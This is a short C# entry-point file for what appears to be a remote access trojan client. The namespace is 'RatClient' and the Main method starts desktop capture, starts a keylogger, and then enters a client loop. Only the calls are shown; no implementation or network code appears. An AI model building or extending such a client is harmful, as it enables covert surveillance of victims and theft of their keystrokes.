using System;
using System.Text;



namespace RatClient
{
    internal class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            
            ClientDesktop.initClientDesktop();
            
            ClientKeylogger.initClientKeylogger();
            ClientBasic.ClientLoop(); //-- must be last


        }

    }
}
